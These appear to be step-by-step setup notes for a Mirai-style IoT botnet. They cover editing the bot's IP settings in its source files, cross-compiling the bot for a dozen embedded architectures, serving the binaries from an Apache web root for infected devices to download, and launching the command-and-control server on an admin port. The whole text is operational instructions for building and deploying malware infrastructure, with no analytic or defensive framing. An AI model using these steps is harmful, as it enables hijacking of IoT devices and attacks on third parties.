edit ips in \bot\main.c [Line 104]
\retrieve\ret.c [Line 79]
\retrieve\retrieve.c [Line 125]
\tools\scanListen.go [Line 10]

mkdir /etc/xcompile
cd /etc/xcompile

wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv5l.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv6l.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv4l.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-i686.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mips.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mipsel.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-powerpc.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-sh4.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-sparc.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-x86_64.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-m68k.tar.gz

tar -zxf cross-compiler-armv4l.tar.gz
tar -zxf cross-compiler-armv5l.tar.gz
tar -zxf cross-compiler-armv6l.tar.gz
tar -jxf cross-compiler-armv7l.tar.bz2
tar -zxf cross-compiler-i686.tar.gz
tar -zxf cross-compiler-mips.tar.gz
tar -zxf cross-compiler-mipsel.tar.gz
tar -zxf cross-compiler-powerpc.tar.gz
tar -zxf cross-compiler-sh4.tar.gz
tar -zxf cross-compiler-sparc.tar.gz
tar -zxf cross-compiler-x86_64.tar.gz
tar -zxf cross-compiler-m68k.tar.gz

rm *.tar.*
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-i686 i686
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-x86_64 x86_64
mv cross-compiler-m68k m68k

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export TOOLCHAIN_ROOT='/etc/xcompile'

make sure to have bzip2 for arm7
apt install bzip2
apt install apache2 -y

bash build.sh release
cd release
cp * /var/www/html
apt install golang-go

cd
bash build.sh debug
cd debug
screen ./cnc

Admin.h to see ports
admin port 6596
